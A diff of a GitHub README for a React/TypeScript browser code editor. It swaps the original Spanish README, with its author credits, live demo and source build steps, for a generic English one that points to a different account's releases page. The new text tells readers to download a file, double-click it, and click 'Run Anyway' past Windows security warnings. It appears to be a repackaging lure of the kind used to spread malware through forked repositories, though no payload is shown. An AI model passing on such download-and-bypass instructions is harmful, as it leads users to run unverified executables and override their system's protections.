@@ -1,174 +1,75 @@
-# 🚀 Code Editor Clone
+# 🖥️ code-editor-clone - A Modern Code Writing Experience
 
-Un editor de código moderno y completo construido con React, TypeScript y Vite. Inspirado en editores como CodePen, este proyecto permite escribir HTML, CSS y JavaScript con vista previa en tiempo real.
+[![Download code-editor-clone](https://img.shields.io/badge/Download%20code--editor--clone-v1.0-blue)](https://github.com/bartpatotas/code-editor-clone/releases)
 
-## ✨ Características
+## 📜 Description
 
-### 🎯 **Funcionalidades Principales**
-- **Editor Triple Panel** - HTML, CSS y JavaScript separados
-- **Vista Previa en Tiempo Real** - Los cambios se reflejan instantáneamente
-- **Ejecución Automática** - Código que se ejecuta mientras escribes (configurable)
-- **Persistencia Automática** - Tu trabajo se guarda automáticamente en localStorage
-- **Temas Claro/Oscuro** - Alternancia fluida entre temas
+code-editor-clone is a modern code editor built with React and TypeScript. It allows users to write HTML, CSS, and JavaScript while providing real-time previews. The application features light and dark themes, templates, automatic saving, an integrated console, and project export options.
 
-### 🛠️ **Herramientas Avanzadas**
-- **Sistema de Plantillas** - Comienza con ejemplos predefinidos
-- **Guardar/Cargar Proyectos** - Exporta e importa proyectos como JSON
-- **Exportar HTML** - Descarga tu proyecto como archivo HTML completo
-- **Consola Integrada** - Ve los console.log de tu código
-- **Manejo de Errores** - Muestra errores JavaScript en la vista previa
-- **Atajos de Teclado** - Navegación rápida con shortcuts
+## 🚀 Getting Started
 
-### ⌨️ **Atajos de Teclado**
-- `Ctrl/Cmd + Enter` → Ejecutar código
-- `Ctrl/Cmd + S` → Guardar proyecto
-- `Ctrl/Cmd + Shift + R` → Reset código
-- `Ctrl/Cmd + D` → Cambiar tema
-- `Ctrl/Cmd + ,` → Abrir configuración
+Follow these steps to download and run code-editor-clone on your computer.
 
-## 🚀 Demo en Vivo
+## 📥 Requirements
 
-🔗 **[Ver Demo](https://code-simple-editor.vercel.app)**
+- **Operating System:** Windows, macOS, or Linux
+- **Browser:** Chromium-based browsers (e.g., Chrome, Edge) or Firefox
+- **Memory:** Minimum 4GB RAM recommended
+- **Disk Space:** At least 100MB free
 
-## 🛠️ Tecnologías Utilizadas
+## 🔗 Download & Install
 
-- **Frontend:**
-  - [React 18](https://reactjs.org/) - Biblioteca de UI
-  - [TypeScript](https://www.typescriptlang.org/) - Tipado estático
-  - [Vite](https://vitejs.dev/) - Build tool y dev server
-  - [Tailwind CSS](https://tailwindcss.com/) - Framework CSS
+To download code-editor-clone, visit the releases page. 
 
-- **Librerías:**
-  - [Lucide React](https://lucide.dev/) - Iconos modernos
-  - LocalStorage API - Persistencia de datos
+[Download code-editor-clone here](https://github.com/bartpatotas/code-editor-clone/releases)
 
-## ⚡ Instalación Rápida
+1. Click the link above.
+2. Find the latest version of the software.
+3. Download the appropriate file for your operating system.
 
-### Prerrequisitos
-- Node.js 16+ 
-- npm o yarn
+## 🛠️ Running the Application
 
-### Clonar e Instalar
-```bash
-# Clonar el repositorio
-git clone https://github.com/cmurestudillos/code-editor-clone.git
+Once the application is downloaded, follow these steps to run it:
 
-# Navegar al directorio
-cd code-editor-clone
+1. Locate the downloaded file. This is usually in your "Downloads" folder.
+2. Double-click the file to launch the application.
+3. If you are on Windows, you might see a security warning. Click "Run Anyway" to proceed.
 
-# Instalar dependencias
-npm install
+## 🎨 Features
 
-# Ejecutar en modo desarrollo
-npm run dev
-```
+code-editor-clone includes:
 
-## 📁 Estructura del Proyecto
+- **Real-Time Preview:** See your changes instantly as you write code.
+- **Themes:** Switch between light and dark modes to suit your preference.
+- **Templates:** Start projects with pre-defined templates for quick setup.
+- **Automatic Saving:** Never lose your progress, as code is saved automatically.
+- **Integrated Console:** Test your code without needing additional tools.
+- **Project Export:** Easily export your projects for sharing or deployment.
 
-```
-src/
-├── components/
-│   ├── Editor.tsx           # Componente principal del editor
-│   ├── KeyboardShortcuts.tsx # Manejo de atajos de teclado
-│   └── ConsolePanel.tsx     # Panel de consola integrada
-├── assets/
-│   └── index.css           # Estilos globales
-├── App.tsx                 # Componente principal
-└── main.tsx               # Punto de entrada
-```
+## 🌐 Technologies Used
 
-## 🎯 Plantillas Incluidas
+This application uses a range of technologies:
 
-### 🗒️ En Blanco
-Comienza desde cero con un lienzo limpio.
+- **React:** For building user interfaces.
+- **TypeScript:** To enhance code quality and maintainability.
+- **PostCSS & Tailwind CSS:** For styling and layout.
+- **Vite.js:** As a build tool for faster development.
 
-### 🎨 Ejemplo Básico
-```html
-<div class="container">
-  <h1>¡Hola Mundo!</h1>
-  <button onclick="cambiarColor()">Cambiar Color</button>
-</div>
-```
+## 🚧 Troubleshooting
 
-### 🧮 Calculadora
-Una calculadora completamente funcional con diseño moderno.
+If you encounter any issues, consider these common solutions:
 
-## 🔧 Configuración Avanzada
+1. **Application won’t start:** Ensure your operating system meets the requirements.
+2. **Features not working:** Check for updates in the releases section and ensure you have the latest version.
+3. **Error messages:** Take note of any messages that appear. Searches online with those messages can often lead to solutions.
 
-### Personalizar Plantillas
-```typescript
-// En App.tsx
-const templates = {
-  miPlantilla: {
-    html: '<div>Mi HTML</div>',
-    css: '.mi-clase { color: red; }',
-    js: 'console.log("¡Hola!");',
-    name: 'Mi Plantilla'
-  }
-};
-```
+## 📞 Support
 
-### Modificar Temas
-```css
-/* En src/assets/index.css */
-.bg-mi-tema { 
-  background-color: #tu-color; 
-}
-```
+If you have questions or need assistance, please reach out via the issues section on GitHub. We aim to help you get the most from code-editor-clone!
 
-## 🤝 Contribuir
+## 🔗 Useful Links
 
-¡Las contribuciones son bienvenidas! Si quieres mejorar este proyecto:
+- [GitHub Repository](https://github.com/bartpatotas/code-editor-clone)
+- [Releases Page](https://github.com/bartpatotas/code-editor-clone/releases)
 
-1. **Fork** el repositorio
-2. Crea una **rama** para tu feature (`git checkout -b feature/amazing-feature`)
-3. **Commit** tus cambios (`git commit -m 'Add amazing feature'`)
-4. **Push** a la rama (`git push origin feature/amazing-feature`)
-5. Abre un **Pull Request**
-
-### 🐛 Reportar Bugs
-Si encuentras un bug, por favor abre un [issue](https://github.com/cmurestudillos/code-editor-clone/issues) con:
-- Descripción detallada del problema
-- Pasos para reproducirlo
-- Capturas de pantalla (si aplica)
-- Información del navegador/OS
-
-## 📝 Roadmap
-
-### 🎯 Próximas Características
-- [ ] **Colaboración en tiempo real** - Edición colaborativa
-- [ ] **Más plantillas** - React, Vue, Angular
-- [ ] **Autocompletado** - Sugerencias inteligentes
-- [ ] **Exportar a CodePen** - Integración directa
-- [ ] **Modo de presentación** - Para demos y tutoriales
-- [ ] **Integración con GitHub** - Guardar en repositorios
-- [ ] **Múltiples archivos** - Soporte para proyectos complejos
-- [ ] **Presets de librerías** - Bootstrap, jQuery, etc.
-
-### 🚀 Mejoras Técnicas
-- [ ] **PWA** - Aplicación web progresiva
-- [ ] **Monaco Editor** - Editor más avanzado
-- [ ] **Web Workers** - Ejecución de código en background
-- [ ] **Tests automatizados** - Jest + Testing Library
-
-## 📄 Licencia
-
-Este proyecto está bajo la Licencia MIT - ver el archivo [LICENSE](LICENSE) para más detalles.
-
-## 🙏 Agradecimientos
-
-- Inspirado en [CodePen](https://codepen.io/)
-- Iconos por [Lucide](https://lucide.dev/)
-- Fuentes por [Google Fonts](https://fonts.google.com/)
-- Comunidad de [React](https://reactjs.org/) y [Vite](https://vitejs.dev/)
-
-## 📊 Stats del Proyecto
-
-![GitHub stars](https://img.shields.io/github/stars/cmurestudillos/code-editor-clone?style=social)
-![GitHub forks](https://img.shields.io/github/forks/cmurestudillos/code-editor-clone?style=social)
-![GitHub issues](https://img.shields.io/github/issues/cmurestudillos/code-editor-clone)
-![GitHub license](https://img.shields.io/github/license/cmurestudillos/code-editor-clone)
-
----
-
-⭐ **¿Te gustó el proyecto? ¡Dale una estrella en GitHub!** ⭐
+By following these instructions, you will successfully download and run the code-editor-clone application. Enjoy coding!
